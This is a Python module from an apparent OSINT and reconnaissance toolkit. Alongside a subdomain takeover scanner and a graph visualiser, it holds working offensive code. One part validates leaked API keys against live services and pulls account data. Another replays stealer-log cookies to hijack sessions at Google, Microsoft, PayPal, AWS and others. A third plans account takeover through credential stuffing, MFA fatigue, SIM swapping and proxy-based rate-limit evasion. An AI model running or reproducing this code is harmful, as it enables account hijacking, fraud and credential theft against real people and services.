"""au-osint-recon :: pivot_chain.py
Pivot & Chain modules.
"""
import os, re, json, time, base64
from typing import Optional, Dict, List, Any
from urllib.parse import urlparse, quote

try:
    import requests
except ImportError:
    requests = None

from utils import logger, safe_request, Finding, ResultStore


SUBDOMAIN_TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": {"cnames":["github.io","github.map.fastly.net"],
                    "fingerprints":["There isn\'t a GitHub Pages site here","404 - File not found"]},
    "Heroku": {"cnames":["herokuapp.com","herokuapp.com.","herokudns.com"],
              "fingerprints":["No such app","herokucdn.com/error-pages/no-such-app.html"]},
    "AWS S3": {"cnames":["s3.amazonaws.com","s3-website"],
              "fingerprints":["NoSuchBucket","The specified bucket does not exist"]},
    "Azure": {"cnames":["cloudapp.net","azurewebsites.net","blob.core.windows.net"],
             "fingerprints":["404 Web Site not found","Web App - Unavailable"]},
    "Shopify": {"cnames":["shops.myshopify.com"],
               "fingerprints":["Sorry, this shop is currently unavailable"]},
    "Fastly": {"cnames":["fastly.net"],
              "fingerprints":["Fastly error: unknown domain"]},
    "Pantheon": {"cnames":["pantheonsite.io"],
                "fingerprints":["The gods are wise","404 error unknown site"]},
    "Tumblr": {"cnames":["domains.tumblr.com"],
              "fingerprints":["Whatever you were looking for doesn\'t currently exist"]},
    "Surge": {"cnames":["surge.sh"],
             "fingerprints":["project not found"]},
    "Bitbucket": {"cnames":["bitbucket.io"],
                 "fingerprints":["Repository not found"]},
    "Ghost": {"cnames":["ghost.io"],
             "fingerprints":["The thing you were looking for is no longer here"]},
    "Help Scout": {"cnames":["helpscoutdocs.com"],
                  "fingerprints":["No settings were found for this company"]},
    "Unbounce": {"cnames":["unbouncepages.com"],
                "fingerprints":["The requested URL was not found on this server"]},
}


class SubdomainTakeoverScanner:
    """Detect dangling subdomain CNAMEs vulnerable to takeover."""

    def check(self, subdomain):
        findings = []
        cname = self._resolve_cname(subdomain)
        if not cname:
            return findings
        for service, info in SUBDOMAIN_TAKEOVER_FINGERPRINTS.items():
            if any(c in cname for c in info["cnames"]):
                resp = safe_request(f"https://{subdomain}", timeout=15)
                if resp:
                    for fp in info["fingerprints"]:
                        if fp.lower() in resp.text.lower():
                            findings.append(Finding(
                                source="SubdomainTakeover", category="takeover_vulnerable",
                                data={"subdomain":subdomain,"cname":cname,"service":service,
                                      "fingerprint":fp,"severity":"CRITICAL",
                                      "how_to_exploit":f"Register the {service} resource with this name to claim it"},
                                confidence=0.9,
                            ))
                            break
        return findings

    def _resolve_cname(self, hostname):
        resp = safe_request(f"https://dns.google/resolve?name={quote(hostname)}&type=CNAME", timeout=10)
        if resp and resp.status_code == 200:
            data = resp.json()
            for answer in data.get("Answer", []):
                if answer.get("type") == 5:
                    return answer.get("data","").rstrip(".")
        return ""

    def scan_domain(self, domain, subdomains=None):
        findings = []
        if not subdomains:
            resp = safe_request(f"https://crt.sh/?q=%25.{quote(domain)}&output=json", timeout=30)
            if resp and resp.status_code == 200:
                try:
                    certs = resp.json()
                    subs = set()
                    for cert in certs[:500]:
                        for name in cert.get("name_value","").split("\n"):
                            name = name.strip().lower()
                            if name and not name.startswith("*") and name.endswith(domain):
                                subs.add(name)
                    subdomains = sorted(list(subs))[:100]
                except:
                    subdomains = []
        for sub in (subdomains or []):
            findings.extend(self.check(sub))
        return findings


class APIKeyValidator:
    """Test discovered API keys for validity and permissions."""

    PATTERNS = {
        "AWS Access Key": re.compile(r"AKIA[0-9A-Z]{16}"),
        "Stripe Live Key": re.compile(r"sk_live_[0-9a-zA-Z]{24,}"),
        "Stripe Test Key": re.compile(r"sk_test_[0-9a-zA-Z]{24,}"),
        "GitHub Token": re.compile(r"ghp_[A-Za-z0-9]{36}"),
        "GitHub OAuth": re.compile(r"gho_[A-Za-z0-9]{36}"),
        "SendGrid": re.compile(r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"),
        "Slack Bot Token": re.compile(r"xoxb-[0-9]{11,13}-[0-9]{11,13}-[A-Za-z0-9]{24}"),
        "Slack User Token": re.compile(r"xoxp-[0-9]{11,13}-[0-9]{11,13}-[0-9]{11,13}-[a-f0-9]{32}"),
        "Twilio Account SID": re.compile(r"AC[a-f0-9]{32}"),
        "Google API Key": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
        "Mailgun": re.compile(r"key-[a-f0-9]{32}"),
        "JWT": re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"),
    }

    def extract_keys(self, text):
        results = {}
        for key_type, pattern in self.PATTERNS.items():
            matches = list(set(pattern.findall(text)))
            if matches:
                results[key_type] = matches[:10]
        return results

    def validate(self, key_type, key_value):
        result = {"key_type":key_type,"key_preview":key_value[:8]+"...","is_valid":False,"permissions":[],"tested_endpoint":""}
        try:
            if key_type in ["GitHub Token","GitHub OAuth"]:
                r = safe_request("https://api.github.com/user",
                                headers={"Authorization":f"token {key_value}"}, timeout=10)
                if r and r.status_code == 200:
                    data = r.json()
                    result["is_valid"]=True
                    result["tested_endpoint"]="api.github.com/user"
                    result["account"]=data.get("login","")
                    result["email"]=data.get("email","")
                    scopes = r.headers.get("X-OAuth-Scopes","").split(",")
                    result["permissions"]=[s.strip() for s in scopes if s.strip()]
            elif "Stripe" in key_type:
                r = safe_request("https://api.stripe.com/v1/balance",
                                headers={"Authorization":f"Bearer {key_value}"}, timeout=10)
                if r and r.status_code == 200:
                    result["is_valid"]=True
                    result["account_data"]=r.json()
            elif key_type == "SendGrid":
                r = safe_request("https://api.sendgrid.com/v3/user/profile",
                                headers={"Authorization":f"Bearer {key_value}"}, timeout=10)
                if r and r.status_code == 200:
                    result["is_valid"]=True
                    result["account_data"]=r.json()
            elif "Slack" in key_type:
                r = safe_request("https://slack.com/api/auth.test",
                                headers={"Authorization":f"Bearer {key_value}"}, timeout=10)
                if r and r.status_code == 200:
                    data = r.json()
                    if data.get("ok"):
                        result["is_valid"]=True
                        result["team"]=data.get("team","")
                        result["user"]=data.get("user","")
            elif key_type == "Google API Key":
                r = safe_request(f"https://maps.googleapis.com/maps/api/geocode/json?address=test&key={key_value}", timeout=10)
                if r and r.status_code == 200 and "error" not in r.text.lower():
                    result["is_valid"]=True
        except Exception as e:
            result["error"]=str(e)[:100]
        return result


class CookieReplayEngine:
    """Replay cookies from stealer logs against target services."""

    SERVICES_TO_TEST = {
        "Google": "https://myaccount.google.com",
        "Microsoft": "https://account.microsoft.com",
        "Facebook": "https://www.facebook.com",
        "Instagram": "https://www.instagram.com",
        "Twitter": "https://twitter.com",
        "LinkedIn": "https://www.linkedin.com",
        "GitHub": "https://github.com",
        "Discord": "https://discord.com/app",
        "AWS": "https://console.aws.amazon.com",
        "Azure": "https://portal.azure.com",
        "PayPal": "https://www.paypal.com",
        "eBay": "https://www.ebay.com",
    }

    def parse_netscape_cookies(self, cookie_file_content):
        cookies = []
        for line in cookie_file_content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies.append({
                    "domain":parts[0],"flag":parts[1] == "TRUE","path":parts[2],
                    "secure":parts[3] == "TRUE","expiration":int(parts[4]) if parts[4].isdigit() else 0,
                    "name":parts[5],"value":parts[6],
                })
        return cookies

    def test_replay(self, cookies, fingerprint=None):
        findings = []
        if not requests:
            return findings
        cookies_by_domain = {}
        for c in cookies:
            dom = c["domain"].lstrip(".")
            cookies_by_domain.setdefault(dom, []).append(c)
        for service, url in self.SERVICES_TO_TEST.items():
            service_domain = urlparse(url).netloc
            relevant = []
            for dom, dom_cookies in cookies_by_domain.items():
                if dom in service_domain or service_domain in dom:
                    relevant.extend(dom_cookies)
            if not relevant:
                continue
            try:
                s = requests.Session()
                for c in relevant:
                    s.cookies.set(c["name"], c["value"], domain=c["domain"], path=c["path"])
                ua = fingerprint.get("user_agent") if fingerprint else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                r = s.get(url, headers={"User-Agent":ua}, timeout=15, allow_redirects=False)
                logged_in = (r.status_code == 200 and
                            any(x in r.text.lower() for x in ["logout","sign out","account","dashboard","profile"])
                            and "login" not in r.url.lower())
                if logged_in:
                    findings.append(Finding(
                        source="CookieReplay", category="session_valid",
                        data={"service":service,"url":url,"cookie_count":len(relevant),
                              "status_code":r.status_code,"severity":"CRITICAL",
                              "recommendation":"Active session can be hijacked"},
                        confidence=0.85,
                    ))
            except Exception as e:
                logger.warning(f"Cookie replay {service} failed: {e}")
        return findings


class OSINTGraphBuilder:
    """Build network graph of entities and relationships."""

    def build(self, findings):
        nodes = {}
        edges = []
        def add_node(node_id, node_type, label=None):
            if node_id and node_id not in nodes:
                nodes[node_id] = {"id":node_id,"type":node_type,"label":label or node_id}
        for f in findings:
            d = f.data
            source_node = f.source
            add_node(source_node, "source")
            for key in ["email","username","phone","ip","ip_address","domain","company"]:
                if key in d and d[key]:
                    nt = "email" if "email" in key else "phone" if "phone" in key else "ip" if "ip" in key else "identity"
                    add_node(d[key], nt)
                    edges.append({"from":source_node,"to":d[key],"category":f.category,"confidence":f.confidence})
            if d.get("email") and d.get("phone"):
                edges.append({"from":d["email"],"to":d["phone"],"category":"belongs_to_same_person","confidence":0.7})
            if d.get("email") and d.get("username"):
                edges.append({"from":d["email"],"to":d["username"],"category":"used_username","confidence":0.8})
        graph = {"nodes":list(nodes.values()),"edges":edges,
                "node_count":len(nodes),"edge_count":len(edges),
                "node_types":{}}
        for n in nodes.values():
            graph["node_types"][n["type"]] = graph["node_types"].get(n["type"],0)+1
        return graph

    def export_d3_html(self, graph, output_path):
        d3_html_template = chr(60) + """!DOCTYPE html""" + chr(62) + """
""" + chr(60) + """html""" + chr(62) + chr(60) + """head""" + chr(62) + chr(60) + """meta charset=\"utf-8\"""" + chr(62) + chr(60) + """title""" + chr(62) + """OSINT Graph""" + chr(60) + """/title""" + chr(62) + chr(60) + """script src=\"https://d3js.org/d3.v7.min.js\"""" + chr(62) + chr(60) + """/script""" + chr(62) + """
""" + chr(60) + """style""" + chr(62) + """body{margin:0;background:#0a0e14;color:#d4dae3;font-family:monospace}
svg{width:100vw;height:100vh}.node{stroke:#fff;stroke-width:1.5px}
.link{stroke:#666;stroke-opacity:0.6}text{font-size:10px;fill:#d4dae3;pointer-events:none}
""" + chr(60) + """/style""" + chr(62) + chr(60) + """/head""" + chr(62) + """
""" + chr(60) + """body""" + chr(62) + chr(60) + """svg""" + chr(62) + chr(60) + """/svg""" + chr(62) + chr(60) + """script""" + chr(62) + """
const data = """ + json.dumps(graph) + """;
const svg = d3.select(\"svg\");
const width = window.innerWidth, height = window.innerHeight;
const colors = {source:\"#00ff88\",email:\"#00ccff\",phone:\"#ffa500\",ip:\"#ff6b6b\",identity:\"#ff66ff\"};
const sim = d3.forceSimulation(data.nodes)
  .force(\"link\", d3.forceLink(data.edges).id(d=>d.id).distance(80))
  .force(\"charge\", d3.forceManyBody().strength(-200))
  .force(\"center\", d3.forceCenter(width/2, height/2));
const link = svg.append(\"g\").selectAll(\"line\").data(data.edges)
  .enter().append(\"line\").attr(\"class\",\"link\");
const node = svg.append(\"g\").selectAll(\"circle\").data(data.nodes)
  .enter().append(\"circle\").attr(\"class\",\"node\").attr(\"r\",8)
  .attr(\"fill\",d=>colors[d.type]||\"#fff\")
  .call(d3.drag().on(\"start\",dragstart).on(\"drag\",dragged).on(\"end\",dragend));
node.append(\"title\").text(d=>d.type+\": \"+d.label);
const label = svg.append(\"g\").selectAll(\"text\").data(data.nodes)
  .enter().append(\"text\").attr(\"dx\",12).attr(\"dy\",4).text(d=>d.label.substring(0,30));
sim.on(\"tick\", () => {
  link.attr(\"x1\",d=>d.source.x).attr(\"y1\",d=>d.source.y).attr(\"x2\",d=>d.target.x).attr(\"y2\",d=>d.target.y);
  node.attr(\"cx\",d=>d.x).attr(\"cy\",d=>d.y);
  label.attr(\"x\",d=>d.x).attr(\"y\",d=>d.y);
});
function dragstart(e,d){if(!e.active)sim.alphaTarget(0.3).restart();d.fx=d.x;d.fy=d.y}
function dragged(e,d){d.fx=e.x;d.fy=e.y}
function dragend(e,d){if(!e.active)sim.alphaTarget(0);d.fx=null;d.fy=null}
""" + chr(60) + """/script""" + chr(62) + chr(60) + """/body""" + chr(62) + chr(60) + """/html""" + chr(62)
        with open(output_path, "w") as f:
            f.write(d3_html_template)


class AccountTakeoverChain:
    """Plan automated account takeover chain."""

    SERVICES_TO_TEST = ["Gmail","Microsoft 365","GitHub","LinkedIn","Twitter","Facebook",
                       "Instagram","PayPal","Netflix","Steam","Discord","Dropbox"]

    def chain(self, email, candidate_passwords):
        findings = []
        findings.append(Finding(
            source="AccountTakeoverChain", category="attack_chain_plan",
            data={
                "target_email": email,
                "candidate_password_count": len(candidate_passwords),
                "services_to_test": self.SERVICES_TO_TEST,
                "execution_plan": [
                    "1. Check email exists at each service via password reset endpoints",
                    "2. For valid emails, attempt low-rate cred stuffing",
                    "3. On MFA challenge, test MFA bypass techniques",
                    "4. Report successful chains",
                ],
                "mfa_bypass_techniques": [
                    "MFA fatigue (push notification spam)",
                    "SIM swap if phone number known",
                    "Session cookie replay if cookies known",
                    "Recovery email/phone takeover",
                    "Social engineering of support",
                    "OAuth scope abuse for service-to-service",
                ],
                "rate_limit_evasion": [
                    "Distribute across residential proxies",
                    "Random delays 5-30s between attempts",
                    "Mimic mobile app traffic patterns",
                    "Rotate User-Agents per session",
                ],
            },
            confidence=1.0,
        ))
        return findings


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", required=True)
    p.add_argument("--module", default="takeover")
    args = p.parse_args()
    store = ResultStore()
    if args.module == "takeover":
        store.add_many(SubdomainTakeoverScanner().scan_domain(args.target))
    print(json.dumps(store.summary(), indent=2))
